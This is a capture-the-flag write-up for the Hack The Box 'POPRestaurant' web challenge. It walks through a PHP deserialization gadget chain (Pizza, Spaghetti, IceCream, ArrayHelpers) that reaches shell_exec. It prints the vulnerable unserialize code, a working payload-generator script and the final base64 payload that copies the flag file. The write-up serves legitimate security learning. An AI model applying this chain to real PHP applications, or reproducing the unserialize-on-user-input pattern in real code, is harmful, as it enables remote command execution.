# HTB-POPRestaurant-Writeup

Upon opening the web application, a login screen shows. By looking at the code it can be seen that there is no vulnerability within the database operations, thus we simply register and login.
We end up in the following homepage, where by clicking to either Pizza, Spaghetti or IceCream we simply add a new request to the list *Your Orders*.

![Schermata del 2024-10-30 16-15-54](https://github.com/user-attachments/assets/703cb679-480e-4ffa-8011-c325a611ffb2)

Using burp-suite it is possible to see that each click will result in a post request to the **order.php** page, having as content a base64 encoded data.
Let's look at the code.

First of all, upon reading the Dockerfile we see that the flag is stored at the **/** directory, with a randomized name. 

Inside the challenge files there is a directory called **Models** that has the PHP class definition for the Pizza, Spaghetti and IceCream objects. Furthermore, each object define a function.
More precisely:
* Pizza defines **__destruct()**;
* Spaghetti defines **__get()**;
* IceCream defines **__invoke()**;

Each one of this function belong to a set of special class functions called *Magic Methods*.
* **__destruct()** gets called when the object gets removed from the memory.
* **__get()** gets called when a non-existing parameter of the object is trying to be called.
* **__invoke()** gets called when the user tries to execute the object as a method.

Moreover, we can see from index.php that the data in the post request is simply the base64 encoding of the **serialized** selected object, initialized with NULL to every parameter.
Two more important things needs to be noticed:

* The contents of order.php
* The contents of Helpers/ArrayHelpers.php

For what concernes the first one, we can see that it takes the data sent via the post request, decodes it and then unserialize it, thus creating the object, if it finds a proper match.

```php
<?php
error_reporting(0);
require_once 'Helpers/ArrayHelpers.php';
require_once 'Helpers/CheckAuthentication.php';
require_once 'Models/PizzaModel.php';
require_once 'Models/IceCreamModel.php';
require_once 'Models/SpaghettiModel.php';
require_once 'Models/DatabaseModel.php';

isAuthenticated();
$username = $_SESSION['username'];
$id = $_SESSION['id'];

$db = new Database();
$order = unserialize(base64_decode($_POST['data']));
$foodName = get_class($order);
$result = $db->Order($id,$foodName);
if ($result) {
    header("Location: index.php");
    die();
} else {
    $errorInfo = $stmt->errorInfo();
    die("Error executing query: " . $errorInfo[2]);
}
```

The latter instead simply extends the ArrayIterator class and defines a new behavior for the **current()** method, where a callback function is called, setting as parameter the current value obtained through the iteration process.

```php
<?php
namespace Helpers{
    use \ArrayIterator;
	class ArrayHelpers extends ArrayIterator
	{
		public $callback;

		public function current()
		{
			$value = parent::current();
			$debug = call_user_func($this->callback, $value);
			var_dump($debug);
			return $value;
		}
	}
}
```

Finally, lets take a quick look at what happens inside the *Magic Methods* saw previously:
```php
<?php
class IceCream
{
  public $flavors;
  public $topping;

  public function __invoke()
  {
    foreach ($this->flavors as $flavor) {
      echo $flavor;
    }
  }
}

class Pizza
{
  public $price;
  public $cheese;
  public $size;

  public function __destruct()
  {
    echo $this->size->what;
  }
}

class Spaghetti
{
  public $sauce;
  public $noodles;
  public $portion;

  public function __get($tomato)
  {
      ($this->sauce)();
  }
}
```

The idea is to exploit the **call_user_func** to execute **shell_exec** to retrieve the flag, but how can we get there?
We know that in order.php we unserialize ad object taken from the post request, that at the end of the script gets destroyed.
At this point you probably have already guessed it, we need to order a Pizza!

Now we know that by sending a post request requiring a Pizza object, the **__destroy()** method will be called, which will simply do **echo $this->size->what**.
The code assumes that the size variable is an object with a parameter of name **what**. We then remember that the **__get()** method will get called when referencing a non-existent parameter of the class.
The idea is then to set the *size* variable to an instance of Spaghetti, thus allowing the method **__get()** to be run. 
Following the same apphroach, if we set the *sauce* variable of the class Spaghetti to an instance of IceCream, the **__invoke()** method will be called, since the **__get()** method will try to call the instance of IceCream as a function.
Finally, the idea is to set *flavors* to an instance of ArrayHelpers, setting the callback to **shell_exec**, also providing to its constructor an array containing a string which will be our command to be executed.
Since we do not know the flag name, we could simply use this trick: 
```bash
cat /*flag* > ./index.php
```
If everything works well, upon opening the homepage of the web application, we should get the flag.
To quickly obtain the payload i created a php script:

```php
<?php
class ArrayHelpers extends ArrayIterator
{
	public $callback = "shell_exec";
}

class Pizza
{
	public $price;
	public $cheese;
	public $size;

}
	
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;
    
}

class IceCream
{
	public $flavors;
	public $topping;
}


$cmd = array(
	0 => "cat /*flag* > ./index.php"
	);

$pizza = new Pizza();
$spaghetti = new Spaghetti();
$icecream = new IceCream();
$icecream->flavors = new ArrayHelpers($cmd);
$spaghetti->sauce = $icecream;
$pizza->size = $spaghetti;

echo base64_encode(serialize($pizza));
```
Again using burpsuite we can modify the post request data and test our payload, which unfortunately doesn't work.
Well, not entirely.
The problem is that the unserialize is not able to find a corresponding class for ArrayHelpers, this happens because it is wrapped inside a **namespace**, "Helpers".

The final working script is the following:
```php
<?php
class ArrayHelpers extends ArrayIterator
{
	public $callback = "shell_exec";
}

class Pizza
{
	public $price;
	public $cheese;
	public $size;

}
	
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;
    
}

class IceCream
{
	public $flavors;
	public $topping;
}


$cmd = array(
	0 => "cat /*flag* > ./index.php"
	);

$pizza = new Pizza();
$spaghetti = new Spaghetti();
$icecream = new IceCream();
$icecream->flavors = new ArrayHelpers($cmd);
$spaghetti->sauce = $icecream;
$pizza->size = $spaghetti;

$my_payload = serialize($pizza);
$my_payload = str_replace('12:"ArrayHelpers"', '21:"\Helpers\ArrayHelpers"', $my_payload);
echo base64_encode($my_payload);
```
And the base64 encoded payload is this: **Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO086OToiU3BhZ2hldHRpIjozOntzOjU6InNhdWNlIjtPOjg6IkljZUNyZWFtIjoyOntzOjc6ImZsYXZvcnMiO086MjE6IlxIZWxwZXJzXEFycmF5SGVscGVycyI6NDp7aTowO2k6MDtpOjE7YToxOntpOjA7czoyNToiY2F0IC8qZmxhZyogPiAuL2luZGV4LnBocCI7fWk6MjthOjE6e3M6ODoiY2FsbGJhY2siO3M6MTA6InNoZWxsX2V4ZWMiO31pOjM7Tjt9czo3OiJ0b3BwaW5nIjtOO31zOjc6Im5vb2RsZXMiO047czo3OiJwb3J0aW9uIjtOO319**
